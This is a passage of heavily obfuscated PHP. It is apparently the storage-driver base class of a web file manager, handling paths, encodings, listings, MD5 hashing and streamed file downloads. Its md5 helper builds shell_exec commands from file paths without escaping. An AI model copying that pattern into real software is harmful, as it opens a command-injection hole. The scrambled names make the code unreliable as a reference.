(!$âÅÊ¤Ø[$€ûá¾”´[84]]) { show_json($€ûá¾”´[1211], !1); } $ñ—¾£æã = $âÅÊ¤Ø[$€ûá¾”´[84]]; } $¶ä½Á = self::init($ñ—¾£æã); if ($¶ä½Á->pathParse[$€ûá¾”´[1157]]) { $ñ—¾£æã = $¶ä½Á->pathParse[$€ûá¾”´[1157]]; $¶ä½Á = self::init($ñ—¾£æã); } $¥³¨Ü©² = $¶ä½Á->getType(); if ($¥³¨Ü©² == $€ûá¾”´[106] || $¥³¨Ü©² == $€ûá¾”´[1212]) { if (!$¶ä½Á->exist($¶ä½Á->path)) { show_json(LNG($€ûá¾”´[105]), !1); } return $¶ä½Á->path; } return !1; } private static function archiveExt($ßì‘æû = '') { $GLOBALS[$_SERVER[ Ö‘ñÄ”][1213]] = $ßì‘æû; } } goto BÏÎÑ«‘Ææ; cØò‰¬Ã‹Ü: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ÆûÒå¦” =& $_SERVER[ Ö‘ñÄ”]; $this->objectDriver = array($ÆûÒå¦”[60], $ÆûÒå¦”[61], $ÆûÒå¦”[62], $ÆûÒå¦”[63], $ÆûÒå¦”[64], $ÆûÒå¦”[65], $ÆûÒå¦”[66], $ÆûÒå¦”[67], $ÆûÒå¦”[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($§¨šŞÕÈ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($§¨šŞÕÈ, $_SERVER[ Ö‘ñÄ”][8]); } return $§¨šŞÕÈ; } public function iconvApp($³ÏÚÑÆç) { return $³ÏÚÑÆç; } public function iconvSystem($â©êı—’) { return $â©êı—’; } public function iconvTo($íÚÍ±¨, $©„Ş‡¾§, $Õ¬°èÊá) { $Ô×ª€ç´ =& $_SERVER[ Ö‘ñÄ”]; if (!$íÚÍ±¨ || !function_exists($Ô×ª€ç´[69])) { return $íÚÍ±¨; } static $‰äÖ¸É¯ = array(); $€„ä¯ÙÃ = $©„Ş‡¾§ . $Ô×ª€ç´[70] . $Õ¬°èÊá . $Ô×ª€ç´[71] . $íÚÍ±¨; if (isset($‰äÖ¸É¯[$€„ä¯ÙÃ])) { return $‰äÖ¸É¯[$€„ä¯ÙÃ]; } if (function_exists($Ô×ª€ç´[72])) { $‰öšë¨ = @mb_convert_encoding($íÚÍ±¨, $Õ¬°èÊá, $©„Ş‡¾§); } else { $‰öšë¨ = @iconv($©„Ş‡¾§, $Õ¬°èÊá, $íÚÍ±¨); } $‰öšë¨ = $‰öšë¨ ? $‰öšë¨ : $íÚÍ±¨; if (strstr($‰öšë¨, $Ô×ª€ç´[73])) { $‰öšë¨ = str_replace($Ô×ª€ç´[73], $Ô×ª€ç´[11], $‰öšë¨); } $‰äÖ¸É¯[$©„Ş‡¾§ . $Ô×ª€ç´[70] . $Õ¬°èÊá . $Ô×ª€ç´[71] . $íÚÍ±¨] = $‰öšë¨; $‰äÖ¸É¯[$Õ¬°èÊá . $Ô×ª€ç´[70] . $©„Ş‡¾§ . $Ô×ª€ç´[71] . $íÚÍ±¨] = $íÚÍ±¨; $‰äÖ¸É¯[$Õ¬°èÊá . $Ô×ª€ç´[70] . $©„Ş‡¾§ . $Ô×ª€ç´[71] . $‰öšë¨] = $íÚÍ±¨; $‰äÖ¸É¯[$©„Ş‡¾§ . $Ô×ª€ç´[70] . $Õ¬°èÊá . $Ô×ª€ç´[71] . $‰öšë¨] = $‰öšë¨; return $‰öšë¨; } public function getPathInner($£î€•Ğ–) { $¬ÎÓáéª = IO::init($£î€•Ğ–); return $¬ÎÓáéª->path; } public function getPathOuter($±£ã“Ü‰) { $°ğ×ô° =& $_SERVER[ Ö‘ñÄ”]; $âõğëñÇ = strlen(trim($this->pathBase, $°ğ×ô°[8])); $±£ã“Ü‰ = substr(trim($±£ã“Ü‰, $°ğ×ô°[8]), $âõğëñÇ); return $this->pathDriver . $°ğ×ô°[8] . ltrim($±£ã“Ü‰, $°ğ×ô°[8]); } public function isParentOf($Ğ‡·¥ãÌ, $‹©º‡) { $°¦ •–Ñ =& $_SERVER[ Ö‘ñÄ”]; $Ğ‡·¥ãÌ = rtrim(strtolower($Ğ‡·¥ãÌ), $°¦ •–Ñ[8]) . $°¦ •–Ñ[8]; $‹©º‡ = rtrim(strtolower($‹©º‡), $°¦ •–Ñ[8]) . $°¦ •–Ñ[8]; $À¬µØ  = strpos($‹©º‡, $Ğ‡·¥ãÌ) === 0; return $À¬µØ ; } public function getType() { $ëªêé˜ =& $_SERVER[ Ö‘ñÄ”]; $ï»Íƒßß = str_replace($ëªêé˜[74], $ëªêé˜[12], get_class($this)); return strtolower($ï»Íƒßß); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Çãçİâ‚, $ğ•«Å€) { $ø»’œğÑ =& $_SERVER[ Ö‘ñÄ”]; $ñû–Á’¼ = rtrim($Çãçİâ‚, $ø»’œğÑ[8]) . $ø»’œğÑ[8] . $ğ•«Å€; $Ğü‡õóı = $this->exist($ñû–Á’¼); return $Ğü‡õóı ? $ñû–Á’¼ : !1; } public function setModifyTime($˜áªÍİ, $Ëµ¾ö˜‚ = '') { } public function renameObject($éÕ¾ğ…, $ˆ½’»’) { $íˆ¯àøÏ = $ˆ½’»’; $éÕ¾ğ… = $this->getPathOuter($éÕ¾ğ…); $ˆ½’»’ = $this->pathFather($éÕ¾ğ…) . $ˆ½’»’; $ú­ÄĞªğ = IO::copy($éÕ¾ğ…, $this->pathFather($éÕ¾ğ…), REPEAT_RENAME_FOLDER, $íˆ¯àøÏ); if ($ú­ÄĞªğ) { IO::remove($éÕ¾ğ…); } return $ú­ÄĞªğ ? $ˆ½’»’ : !1; } public function tempFile($ÔöÄÊ¬Ü = '', $×øÜÌ = '') { if (!$ÔöÄÊ¬Ü) { $ÔöÄÊ¬Ü = rand_string(15); } $îƒ‘ÇÒ™ = TEMP_FILES . rand_string(15) . $_SERVER[ Ö‘ñÄ”][8]; @mkdir($îƒ‘ÇÒ™, DEFAULT_PERRMISSIONS, !0); $·¥àì» = $îƒ‘ÇÒ™ . $ÔöÄÊ¬Ü; @touch($·¥àì»); if ($×øÜÌ) { file_put_contents($·¥àì», $×øÜÌ); } return $·¥àì»; } public function tempFileRemve($” †£’¾) { @unlink($” †£’¾); @rmdir($this->pathFather($” †£’¾)); } public function mkfile($˜•ĞÍµó, $şÒı¿¹ä = '', $ğæÎ¹•“ = REPEAT_RENAME) { } public function mkdir($®ÄÄû¼ , $²ÁèÎëÊ = REPEAT_SKIP) { } public function delFile($ŸÎ…ñÈ¾) { } public function delFolder($å‘™É¿“) { } public function copyFile($ñ¢ĞèÏÂ, $àé÷§±Ş) { } public function moveFile($Î÷ü§€›, $›Ã¸ü®¡) { } public function remove($ÔĞÄ¤›Õ) { if ($this->isFile($ÔĞÄ¤›Õ)) { return $this->delFile($ÔĞÄ¤›Õ); } return $this->delFolder($ÔĞÄ¤›Õ); } public function rename($±ÃòµÒù, $ú©é©ÒÌ) { } public function exist($öÚ—úÀ“) { } public function findByHash($ŞáµØĞˆ = '', $Êœáš­¶ = '') { return !1; } public function isFile($ÔÖıª…ô) { } public function isFolder($ûˆ£ç›ü) { } public function size($‰£ãœåä) { } public function info($ìÇÑˆùô) { } public function infoSimple($ëÆ‰ŞÃü) { return $this->info($ëÆ‰ŞÃü); } public function infoAuth($”ÑçÕÕÚ) { return $this->info($”ÑçÕÕÚ); } public function infoFull($Ë¶Õ×à) { return $this->info($Ë¶Õ×à); } public function infoWithChildren($²­¢«á) { $€£Á‘Ï =& $_SERVER[ Ö‘ñÄ”]; static $¨Àè€ö = array(); if (isset($¨Àè€ö[$²­¢«á])) { return $¨Àè€ö[$²­¢«á]; } $ìÈ¼Ÿç³ = $this->info($²­¢«á); if ($ìÈ¼Ÿç³ && $ìÈ¼Ÿç³[$€£Á‘Ï[33]] == $€£Á‘Ï[75]) { $‚×ºøÙÅ = array($€£Á‘Ï[76] => 0, $€£Á‘Ï[77] => 0, $€£Á‘Ï[78] => 0); $this->infoChildren($²­¢«á, $‚×ºøÙÅ); $ìÈ¼Ÿç³[$€£Á‘Ï[76]] = $‚×ºøÙÅ[$€£Á‘Ï[76]]; $ìÈ¼Ÿç³[$€£Á‘Ï[79]] = array($€£Á‘Ï[80] => $‚×ºøÙÅ[$€£Á‘Ï[77]], $€£Á‘Ï[81] => $‚×ºøÙÅ[$€£Á‘Ï[78]]); $¨Àè€ö[$²­¢«á] = $ìÈ¼Ÿç³; } return $ìÈ¼Ÿç³; } public function listPath($¾á¸€ÕÑ, $‚æÌ‰æê = false) { } public function has($‡´ËÑ¹ù, $«Â¤ÉªĞ = false, $±íç¬ğÆ = false) { } public function canRead($‡¤íö÷—) { } public function canWrite($µŞ€Şß) { } public function getContent($ªŞ„Ï œ) { } public function setContent($Ø«·šÔ¡, $›Ş…Ùıö = '') { } protected function infoChildren($¹­õ´Í», &$¸½Ğ·Œ·) { $ôØ´ÁµÑ =& $_SERVER[ Ö‘ñÄ”]; check_abort_echo(); $üÃÒµ½ = $this->listPath($¹­õ´Í», !0); $üÃÒµ½ = array_merge($üÃÒµ½[$ôØ´ÁµÑ[82]], $üÃÒµ½[$ôØ´ÁµÑ[83]]); foreach ($üÃÒµ½ as $·ÖØáƒè) { if ($·ÖØáƒè[$ôØ´ÁµÑ[33]] == $ôØ´ÁµÑ[75]) { $¸½Ğ·Œ·[$ôØ´ÁµÑ[78]]++; $Æ¼ã‹ˆÌ = $this->getPathInner($·ÖØáƒè[$ôØ´ÁµÑ[84]]); $this->infoChildren($Æ¼ã‹ˆÌ, $¸½Ğ·Œ·); } else { $¸½Ğ·Œ·[$ôØ´ÁµÑ[77]]++; $¸½Ğ·Œ·[$ôØ´ÁµÑ[76]] += $·ÖØáƒè[$ôØ´ÁµÑ[76]]; } } } public function fileSubstr($ª°ó‚áİ, $ÔÛô½«, $¶æˆ½ŸÖ) { } public function listAll($ ¶šÚÂ·) { } public function listAllMake($ÎåÃø», &$ëøşÚğ) { $Ø¨½‰– =& $_SERVER[ Ö‘ñÄ”]; check_abort_echo(); $×äãäŞï = $this->listPath($ÎåÃø», !0); if (!$×äãäŞï) { return; } $‘ÑİÚ¦æ = array_merge($×äãäŞï[$Ø¨½‰–[82]], $×äãäŞï[$Ø¨½‰–[83]]); foreach ($‘ÑİÚ¦æ as $´å¢ÈÂŸ) { $Ö³À§  = $´å¢ÈÂŸ[$Ø¨½‰–[33]] == $Ø¨½‰–[75]; $É„â å¶ = array($Ø¨½‰–[84] => $´å¢ÈÂŸ[$Ø¨½‰–[84]], $Ø¨½‰–[75] => $Ö³À§ ); if (isset($´å¢ÈÂŸ[$Ø¨½‰–[76]])) { $É„â å¶[$Ø¨½‰–[76]] = $´å¢ÈÂŸ[$Ø¨½‰–[76]]; } if (isset($´å¢ÈÂŸ[$Ø¨½‰–[85]])) { $É„â å¶[$Ø¨½‰–[85]] = $´å¢ÈÂŸ[$Ø¨½‰–[85]]; } if (!$Ö³À§ ) { $ëøşÚğ[] = $É„â å¶; continue; } $ëøşÚğ[] = $É„â å¶; $ÁË¶ú•é = $´å¢ÈÂŸ[$Ø¨½‰–[84]]; $ü‚„’ƒ© = $this->pathDriver; if (substr($´å¢ÈÂŸ[$Ø¨½‰–[84]], 0, strlen($ü‚„’ƒ©)) == $ü‚„’ƒ©) { $ÁË¶ú•é = substr($ÁË¶ú•é, strlen($ü‚„’ƒ©)); } $this->listAllMake($ÁË¶ú•é, $ëøşÚğ); } } public function listAllSimple($¤ëÅæô) { $±ğïÜ =& $_SERVER[ Ö‘ñÄ”]; $¼­Ô©èŞ = array(); $„’ßŞ‘Õ = $this->listAll($¤ëÅæô); $ş“—Ç¿« = $this->getPathOuter($¤ëÅæô); foreach ($„’ßŞ‘Õ as $¹ÂÍâ) { $ú¯Ë²œÅ = $¹ÂÍâ[$±ğïÜ[84]]; $Ï‚¶Ø ¨ = $¹ÂÍâ[$±ğïÜ[84]]; if (isset($¹ÂÍâ[$±ğïÜ[86]])) { $ú¯Ë²œÅ = $¹ÂÍâ[$±ğïÜ[86]][$±ğïÜ[84]]; $¹ÂÍâ[$±ğïÜ[76]] = $¹ÂÍâ[$±ğïÜ[86]][$±ğïÜ[76]]; $¹ÂÍâ[$±ğïÜ[85]] = $¹ÂÍâ[$±ğïÜ[86]][$±ğïÜ[85]]; } else { $Ï‚¶Ø ¨ = substr($¹ÂÍâ[$±ğïÜ[84]], strlen(get_path_father($ş“—Ç¿«))); $Ï‚¶Ø ¨ = $±ğïÜ[8] . ltrim($Ï‚¶Ø ¨, $±ğïÜ[8]); } $Ğç°¨Õş = array($±ğïÜ[84] => $Ï‚¶Ø ¨, $±ğïÜ[75] => $¹ÂÍâ[$±ğïÜ[75]]); if (isset($¹ÂÍâ[$±ğïÜ[76]]) && !$¹ÂÍâ[$±ğïÜ[75]]) { $Ğç°¨Õş[$±ğïÜ[76]] = $¹ÂÍâ[$±ğïÜ[76]]; } if (isset($¹ÂÍâ[$±ğïÜ[85]])) { $Ğç°¨Õş[$±ğïÜ[85]] = $¹ÂÍâ[$±ğïÜ[85]]; } if (!$¹ÂÍâ[$±ğïÜ[75]]) { $Ğç°¨Õş[$±ğïÜ[87]] = $ú¯Ë²œÅ; } $¼­Ô©èŞ[] = $Ğç°¨Õş; } return $¼­Ô©èŞ; } public function upload($ÏÑ°½î, $ç»ÜëÄ, $Ñ€¥°ù = false, $‡ÙÓØ‡ = REPEAT_REPLACE) { } public function uploadFileByID($ş¥µŒÒ«, $ìí§£Õ´, $ó¼¾¼‡Ã) { } public function uploadFileByPath($ˆª°¥øÈ, $óèŸşøô, $ÌÄô¡ˆŒ = array()) { } public function isUploadServer() { $ƒŸØ€Ş° =& $_SERVER[ Ö‘ñÄ”]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ƒŸØ€Ş°[88]) { return !0; } return $GLOBALS[$ƒŸØ€Ş°[6]][$ƒŸØ€Ş°[89]][$ƒŸØ€Ş°[90]]; } public function isFileOutServer() { $Œè£‚Ì® =& $_SERVER[ Ö‘ñÄ”]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Œè£‚Ì®[88]) { return !0; } return $GLOBALS[$Œè£‚Ì®[6]][$Œè£‚Ì®[89]][$Œè£‚Ì®[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($ø áåÔø) { $ŒÏ¨©Û =& $_SERVER[ Ö‘ñÄ”]; if (!$this->isCdnHost()) { return $ø áåÔø; } return str_replace(trim(get_url_root($ø áåÔø), $ŒÏ¨©Û[8]), trim($this->cdnHost, $ŒÏ¨©Û[8]), $ø áåÔø); } public function uploadLink($ÏíûÁè¥, $¼éË‚úÊ = 0) { $ÊÈÓà‡å =& $_SERVER[ Ö‘ñÄ”]; if ($this->isUploadServer()) { return; } $úÀì¦ ± = $this->getType(); if (!in_array($úÀì¦ ±, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Ê°˜¹Ü“ = 1024 * 1024 * 10; $¹»Ÿô‘ = $¼éË‚úÊ <= $Ê°˜¹Ü“ ? $ÊÈÓà‡å[92] : $ÊÈÓà‡å[93]; $„íÂĞÊ = (!$¼éË‚úÊ ? 1 : ceil($¼éË‚úÊ / pow(1024, 3))) * 3600 * 4; $³çÈ—« = $this->{$¹»Ÿô‘}($ÏíûÁè¥, $„íÂĞÊ); if ($³çÈ—«) { $³çÈ—«[$ÊÈÓà‡å[94]] = $ÏíûÁè¥; $³çÈ—«[$ÊÈÓà‡å[95]] = $úÀì¦ ±; } return $³çÈ—«; } public function uploadFormData($ª©¤Ï¼‹, $–†ÖàÙÀ = 3600) { } public function multiUploadFormData($˜ºÖõ¡Á, $åøË“¿ = 3600) { } public function download($ŒÎåèû¤, $öâ¨®º´) { } public function ext($äª¦¼úÄ) { $°‰³Š«² =& $_SERVER[ Ö‘ñÄ”]; if (strpos($äª¦¼úÄ, $°‰³Š«²[8]) === -1) { $°¿™¨² = $äª¦¼úÄ; } else { $°¿™¨² = $this->pathThis($äª¦¼úÄ); } $¿×‚œ¬Ü = $°‰³Š«²[12]; if (strstr($°¿™¨², $°‰³Š«²[10])) { $¿×‚œ¬Ü = substr($°¿™¨², strrpos($°¿™¨², $°‰³Š«²[10]) + 1); $¿×‚œ¬Ü = strtolower($¿×‚œ¬Ü); } if (strlen($¿×‚œ¬Ü) > 3 && preg_match($°‰³Š«²[96], $¿×‚œ¬Ü, $À…“Û·ˆ)) { $¿×‚œ¬Ü = $°‰³Š«²[12]; } return $¿×‚œ¬Ü; } public function pathThis($Ñõ® ) { $Í¤ŒÃ–Æ =& $_SERVER[ Ö‘ñÄ”]; $Ñõ®  = str_replace($Í¤ŒÃ–Æ[97], $Í¤ŒÃ–Æ[8], rtrim($Ñõ® , $Í¤ŒÃ–Æ[8])); $í…êı±Î = strrpos($Ñõ® , $Í¤ŒÃ–Æ[8]); if ($í…êı±Î === !1) { return $Ñõ® ; } return substr($Ñõ® , $í…êı±Î + 1); } public function pathFather($”ŠüÚŸÛ) { $Ë«›ê•× =& $_SERVER[ Ö‘ñÄ”]; $”ŠüÚŸÛ = str_replace($Ë«›ê•×[97], $Ë«›ê•×[8], rtrim($”ŠüÚŸÛ, $Ë«›ê•×[8])); $Û€€©ÖÄ = strrpos($”ŠüÚŸÛ, $Ë«›ê•×[8]); if ($Û€€©ÖÄ === !1) { return $Ë«›ê•×[12]; } return substr($”ŠüÚŸÛ, 0, $Û€€©ÖÄ + 1); } public function hashSimple($Ì¶¶Æ¾à) { $–úöï—– =& $_SERVER[ Ö‘ñÄ”]; if (!$Ì¶¶Æ¾à) { return md5($–úöï—–[12]); } $ó©’õŞ§ = $this->size($Ì¶¶Æ¾à); $º—çú = 200; $æ‘²¨±‹ = 50; if ($ó©’õŞ§ <= $º—çú * $æ‘²¨±‹) { return $this->hashMd5($Ì¶¶Æ¾à) . $ó©’õŞ§; } $ÀÁ‹£Ãî = intval($ó©’õŞ§ / $æ‘²¨±‹); $‚ÛÖº¯” = $–úöï—–[12]; for ($´’úñÕª = 0; $´’úñÕª < $æ‘²¨±‹; $´’úñÕª++) { $‚ÛÖº¯” .= $this->fileSubstr($Ì¶¶Æ¾à, $ÀÁ‹£Ãî * $´’úñÕª, $º—çú); } $‚ÛÖº¯” .= $this->fileSubstr($Ì¶¶Æ¾à, $ó©’õŞ§ - $º—çú, $º—çú); return md5($‚ÛÖº¯”) . $ó©’õŞ§; } public static $md5Cache = array(); public function hashMd5($åì’–ò) { if (!$åì’–ò) { return md5($_SERVER[ Ö‘ñÄ”][12]); } $åì’–ò = $this->iconvSystem($åì’–ò); if (isset(self::$md5Cache[$åì’–ò])) { return self::$md5Cache[$åì’–ò]; } self::$md5Cache[$åì’–ò] = $this->hashMd5Shell($åì’–ò); if (!self::$md5Cache[$åì’–ò]) { self::$md5Cache[$åì’–ò] = @md5_file($åì’–ò); } return self::$md5Cache[$åì’–ò]; } private function hashMd5Shell($òÉ¼®äÚ) { $¿Ü«Äëì =& $_SERVER[ Ö‘ñÄ”]; if (!$òÉ¼®äÚ) { return md5($¿Ü«Äëì[12]); } if (!function_exists($¿Ü«Äëì[98])) { return !1; } $ı¾›£¥š = array($¿Ü«Äëì[99], $¿Ü«Äëì[100]); $³³‰¡¤ã = Cache::get($¿Ü«Äëì[101]); if (!$³³‰¡¤ã) { $Ò”ªëÁæ = BASIC_PATH . $¿Ü«Äëì[102]; $™Ö„ãÈ­ = md5_file($Ò”ªëÁæ); $³³‰¡¤ã = $¿Ü«Äëì[103]; foreach ($ı¾›£¥š as $—áÂÅá…) { $Ÿ¨ÁÚÂ‘ = shell_exec($—áÂÅá… . "\40\x22{$Ò”ªëÁæ}\x22"); if ($Ÿ¨ÁÚÂ‘ && substr(trim($Ÿ¨ÁÚÂ‘), 0, 32) == $™Ö„ãÈ­) { $³³‰¡¤ã = $—áÂÅá…; break; } } Cache::set($¿Ü«Äëì[101], $³³‰¡¤ã, 3600); } if ($³³‰¡¤ã == $¿Ü«Äëì[103]) { return !1; } $Ÿ¨ÁÚÂ‘ = shell_exec($³³‰¡¤ã . "\40\42{$òÉ¼®äÚ}\42"); $Ÿ¨ÁÚÂ‘ = str_replace($¿Ü«Äëì[104], $¿Ü«Äëì[12], $Ÿ¨ÁÚÂ‘); return substr($Ÿ¨ÁÚÂ‘, 0, 32); } public function link($Ò˜”½ş±) { return $Ò˜”½ş±; } public function fileOut($•Ùü§Ü, $ŒÖ±½„À = false, $ãëŒŠî½ = false, $‡¦şÍ±º = '') { $€È¨ ®“ =& $_SERVER[ Ö‘ñÄ”]; $this->cacheMethod(null, null); if (!$•Ùü§Ü || !$this->exist($•Ùü§Ü)) { show_json(LNG($€È¨ ®“[105]), !1, $ãëŒŠî½); } $Ğ•½à¾ù = $this->getType() == $€È¨ ®“[106]; $«©úñÜ˜ = $GLOBALS[$€È¨ ®“[6]][$€È¨ ®“[89]][$€È¨ ®“[107]][$€È¨ ®“[108]]; $œˆŞŸâ = (double) $GLOBALS[$€È¨ ®“[6]][$€È¨ ®“[89]][$€È¨ ®“[107]][$€È¨ ®“[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $¶©ôºˆè = $this->infoFull($•Ùü§Ü); $œÁĞ¾ŠŠ = $¶©ôºˆè[$€È¨ ®“[76]]; $åÑ–å€ = gmdate($€È¨ ®“[110], $¶©ôºˆè[$€È¨ ®“[85]]); $Á¹°úŞŒ = $ãëŒŠî½ ? $ãëŒŠî½ : $this->iconvApp($¶©ôºˆè[$€È¨ ®“[32]]); $«¯¾ó‹Ş = 0; $ÈÕîÌ“ï = $œÁĞ¾ŠŠ - 1; $ƒ±ñµšŞ = $this->ext($Á¹°úŞŒ); if (in_array($ƒ±ñµšŞ, array($€È¨ ®“[111], $€È¨ ®“[112], $€È¨ ®“[113], $€È¨ ®“[114]))) { $ƒ±ñµšŞ = $€È¨ ®“[115]; } if (in_array($ƒ±ñµšŞ, array($€È¨ ®“[116]))) { $ƒ±ñµšŞ = $€È¨ ®“[117]; } if (!$‡¦şÍ±º) { $‡¦şÍ±º = md5($åÑ–å€ . $this->hashSimple($•Ùü§Ü)); } $‡¦şÍ±º = $€È¨ ®“[118] . $‡¦şÍ±º . $€È¨ ®“[118]; $¤õëìÊ = get_file_mime($ƒ±ñµšŞ); $å¯’ƒğæ = !0; $å¯’ƒğæ = isset($_GET[$€È¨ ®“[119]]) ? !1 : !0; if ($ŒÖ±½„À === !1 && !mime_support($¤õëìÊ)) { $¤õëìÊ = $€È¨ ®“[120]; } header($€È¨ ®“[121]); header($€È¨ ®“[122] . $¤õëìÊ); $›áµê€ö = rawurlencode($Á¹°úŞŒ); $›áµê€ö = $€È¨ ®“[118] . $›áµê€ö . $€È¨ ®“[123] . $›áµê€ö; if ($ŒÖ±½„À) { header($€È¨ ®“[124]); header($€È¨ ®“[125] . $›áµê€ö); } else { if ($å¯’ƒğæ) { header($€È¨ ®“[126] . $›áµê€ö); } } header($€È¨ ®“[127] . gmdate($€È¨ ®“[110], time() + 3600 * 24 * 30) . $€È¨ ®“[128]); header($€È¨ ®“[129]); header($€È¨ ®“[130]); header($€È¨ ®“[131]); if (isset($_SERVER[$€È¨ ®“[132]]) && strtotime($_SERVER[$€È¨ ®“[132]]) == $¶©ôºˆè[$€È¨ ®“[85]]) { header($€È¨ ®“[133], !0, 304); die; } if (isset($_SERVER[$€È¨ ®“[134]]) && $_SERVER[$€È¨ ®“[134]] == $‡¦şÍ±º) { header($€È¨ ®“[135] . $‡¦şÍ±º, !0, 304); die; } header($€È¨ ®“[135] . $‡¦şÍ±º); header($€È¨ ®“[136] . $åÑ–å€ . $€È¨ ®“[128]); header($€È¨ ®“[137] . $Á¹°úŞŒ); header($€È¨ ®“[138]); header($€È¨ ®“[139] . $œÁĞ¾ŠŠ); header($€È¨ ®“[140]); if (!$ŒÖ±½„À && $ƒ±ñµšŞ == $€È¨ ®“[141]) { if ($œÁĞ¾ŠŠ > 1024 * 1024 * 5) { die; } $Ø‚ı»Ÿ˜ = $this->getContent($•Ùü§Ü); $Ø‚ı»Ÿ˜ = Html::clearSVG($Ø‚ı»Ÿ˜); header($€È¨ ®“[142] . strlen($Ø‚ı»Ÿ˜)); echo $Ø‚ı»Ÿ˜; die; } $Ø¨÷¼å‚ = strtolower($_SERVER[$€È¨ ®“[143]]); if ($Ğ•½à¾ù && $Ø¨÷¼å‚ && $«©úñÜ˜) { if (strstr($Ø¨÷¼å‚, $€È¨ ®“[144])) { header($€È¨ ®“[145] . $•Ùü§Ü); } else { if (strstr($Ø¨÷¼å‚, $€È¨ ®“[146])) { header($€È¨ ®“[147] . $•Ùü§Ü); } else { if (strstr($Ø¨÷¼å‚, $€È¨ ®“[148])) { header($€È¨ ®“[149] . $•Ùü§Ü); } } } if ($œˆŞŸâ) { header($€È¨ ®“[150] . $œˆŞŸâ); } return; } if (isset($_SERVER[$€È¨ ®“[151]])) { if (preg_match($€È¨ ®“[152], $_SERVER[$€È¨ ®“[151]], $„Øá‚èç)) { $«¯¾ó‹Ş = intval($„Øá‚èç[1]); if (!empty($„Øá‚èç[2])) { $ÈÕîÌ“ï = intval($„Øá‚èç[2]); } } header($€È¨ ®“[153]); header("\x43\157\156\164\x65\x6e\164\x2d\122\x61\x6e\x67\145\72\40\x62\171\x74\x65\163\40{$«¯¾ó‹Ş}\55{$ÈÕîÌ“ï}\57" . $œÁĞ¾ŠŠ); } else { header($€È¨ ®“[154]); } header($€È¨ ®“[155]); $ÄœóÆë„ = !0; if ($_SERVER[$€È¨ ®“[156]] == $€È¨ ®“[157] && $œÁĞ¾ŠŠ > 1204 * 1024 * 1024 * 2) { $ÄœóÆë„ = !1; } if ($ÄœóÆë„) { header($€È¨ ®“[158] . ($ÈÕîÌ“ï - $«¯¾ó‹Ş + 1)); } if ($_SERVER[$€È¨ ®“[159]] == $€È¨ ®“[160]) { return; } $‰øš“… = 1024 * 100; $œ¯Ã„½ = 0; if ($œˆŞŸâ) { $œ¯Ã„½ = intval(1000 * 1000 * ($‰øš“… / $œˆŞŸâ)); } while ($«¯¾ó‹Ş <= $ÈÕîÌ“ï) { $¬›Ï¬–’ = timeFloat(); check_abort(); $ûª‚á Ò = $ÈÕîÌ“ï - $«¯¾ó‹Ş + 1; if ($ûª‚á Ò <= $‰øš“…) { $‰øš“… = $ûª‚á Ò; } echo $this->fileSubstr($•Ùü§Ü, $«¯¾ó‹Ş, $‰øš“…); $«¯¾ó‹Ş += $‰øš“…; if ($‰øš“… == $ûª‚á Ò) { $«¯¾ó‹Ş = $ÈÕîÌ“ï + 1; } if ($œ¯Ã„½) { $ó˜»öü = intval(1000 * 1000 * (timeFloat() - $¬›Ï¬–’)); $ƒÈ˜‰˜ç = $œ¯Ã„½ - $ó˜»öü; if ($ƒÈ˜‰˜ç > 5) { usleep($ƒÈ˜‰˜ç); } } } } public function fileOutServer($•Ò¡îÜ, $õ…ïÓò = false, $¢—Ÿ÷†¼ = false, $¯ñ‚ëû‰ = '') { $this->fileOut($•Ò¡îÜ, $õ…ïÓò, $¢—Ÿ÷†¼, $¯ñ‚ëû‰); } public function fileOutLink($‘ßÑ“®) { header($_SERVER[ Ö‘ñÄ”][161] . $‘ßÑ“®); die; } public function cacheMethod($†Ø¯ı‡, $»„ŒØÙ, $ÒØ’¬Ù = null) { $»ìéÓÙª =& $_SERVER[ Ö‘ñÄ”]; static $æµí ”ë = array(); $·ÅÇüğÜ = $»„ŒØÙ ? ltrim($this->getPathOuter($»„ŒØÙ), $»ìéÓÙª[8]) : $»ìéÓÙª[12]; $¼Ğó¸ç“ = $»ìéÓÙª[162] . $†Ø¯ı‡ . $»ìéÓÙª[163] . rtrim($·ÅÇüğÜ, $»ìéÓÙª[8]); if (is_null($†Ø¯ı‡)) { $æµí ”ë = array(); return; } if (is_null($»„ŒØÙ)) { foreach ($æµí ”ë as $¼Ğó¸ç“ => $ëıÎ¨Çª) { if (!strstr($¼Ğó¸ç“, $»ìéÓÙª[162] . $†Ø¯ı‡ . $»ìéÓÙª[164])) { continue; } unset($æµí ”ë[$¼Ğó¸ç“]); } return; } if (!is_null($ÒØ’¬Ù)) { $æµí ”ë[$¼Ğó¸ç“] = $ÒØ’¬Ù; return; } $º§¢Õàå = isset($æµí ”ë[$¼Ğó¸ç“]) ? $æµí ”ë[$¼Ğó¸ç“] : null; if (!is_null($º§¢Õàå)) { return $º§¢Õàå; } $º§¢Õàå = $this->{$†Ø¯ı‡}($»„ŒØÙ); $æµí ”ë[$¼Ğó¸ç“] = $º§¢Õàå; return $º§¢Õàå; } public function cacheMethodInfoSet($«“À§õŠ, $íúªæÎ§, $™Û²Ô¡Ú = false) { $Ü¼³ò =& $_SERVER[ Ö‘ñÄ”]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($Ü¼³ò[165], $«“À§õŠ, $íúªæÎ§); $this->cacheMethod($Ü¼³ò[166], $«“À§õŠ, $íúªæÎ§ ? !1 : !0); if (is_array($™Û²Ô¡Ú)) { $this->cacheMethod($Ü¼³ò[167], $«“À§õŠ, $™Û²Ô¡Ú); } } public function fileOutImage($¥‘Ãİê¯, $Ÿ²¸ÚÃô = 250) { $ƒÄã°ë =& $_SERVER[ Ö‘ñÄ”]; set_timeout(); if (substr($¥‘Ãİê¯, 0, 4) == $ƒÄã°ë[148]) { $this->fileOutLink($¥‘Ãİê¯); } $£Šºí = $this->info($¥‘Ãİê¯); $Õ–÷á Œ = $£Šºí[$ƒÄã°ë[32]]; $°¡Ğå»… = !1; if 